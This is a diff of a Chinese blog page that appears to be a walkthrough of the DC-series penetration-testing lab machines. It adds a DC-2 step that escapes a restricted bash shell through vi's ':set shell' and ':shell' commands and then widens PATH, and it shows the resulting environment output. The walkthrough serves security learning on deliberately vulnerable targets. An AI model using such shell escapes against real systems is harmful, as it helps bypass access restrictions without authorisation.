@@ -54,7 +54,8 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-9.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-10.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-11.png">
-<meta property="og:updated_time" content="2019-09-22T15:50:07.175Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-14.png">
+<meta property="og:updated_time" content="2019-09-22T16:18:17.769Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透学习 — DC1-DC8系列靶机渗透测试">
 <meta name="twitter:description" content="前言由于网络环境的变化，攻击机和靶机的IP可能发生改变。在每道题目中如果有改变，我会在开头的环境中写出来 DC1环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84） 靶机：DC1（IP：192.168.43.27） 渗透测试打开DC1靶机之后，需要输入登录的账号和密码，但是却不知道  由于IP也不知道，所以没有目标下手，所以需要获取靶机">
@@ -343,6 +344,10 @@
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-10.png" alt="2-10"></p>
 <p>连接成功，但是碰到了<code>rbash (restricited Bash)</code>，许多命令都被禁用了</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-11.png" alt="2-11"></p>
+<p>用vi命令绕过受限的shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi flag3.txt</span><br><span class="line">:set shell=/bin/bash</span><br><span class="line">:shell</span><br><span class="line">export -p</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/2-14.png" alt="2-14"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># export PATH=$PATH:/bin/</span></span><br><span class="line"><span class="comment"># export -p</span></span><br><span class="line"></span><br><span class="line">tom@DC-2:~$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/</span><br><span class="line">tom@DC-2:~$ <span class="built_in">export</span> -p</span><br><span class="line"><span class="built_in">declare</span> -x HOME=<span class="string">"/home/tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x LANG=<span class="string">"en_US.UTF-8"</span></span><br><span class="line"><span class="built_in">declare</span> -x LOGNAME=<span class="string">"tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x MAIL=<span class="string">"/var/mail/tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x OLDPWD</span><br><span class="line"><span class="built_in">declare</span> -x PATH=<span class="string">"/home/tom/usr/bin:/bin/"</span>	<span class="comment">#此处加入了bash</span></span><br><span class="line"><span class="built_in">declare</span> -x PWD=<span class="string">"/home/tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x SHELL=<span class="string">"/bin/rbash"</span></span><br><span class="line"><span class="built_in">declare</span> -x SHLVL=<span class="string">"2"</span></span><br><span class="line"><span class="built_in">declare</span> -x SSH_CLIENT=<span class="string">"192.168.2.107 45502 7744"</span></span><br><span class="line"><span class="built_in">declare</span> -x SSH_CONNECTION=<span class="string">"192.168.2.107 45502 192.168.2.109 7744"</span></span><br><span class="line"><span class="built_in">declare</span> -x SSH_TTY=<span class="string">"/dev/pts/0"</span></span><br><span class="line"><span class="built_in">declare</span> -x TERM=<span class="string">"xterm-256color"</span></span><br><span class="line"><span class="built_in">declare</span> -x USER=<span class="string">"tom"</span></span><br><span class="line"><span class="built_in">declare</span> -x VIM=<span class="string">"/usr/share/vim"</span></span><br><span class="line"><span class="built_in">declare</span> -x VIMRUNTIME=<span class="string">"/usr/share/vim/vim74"</span></span><br></pre></td></tr></table></figure>
 
       
 
@@ -554,15 +559,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
+                <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -570,11 +571,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">博客搭建</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
             
             <div class="clearfix"></div>
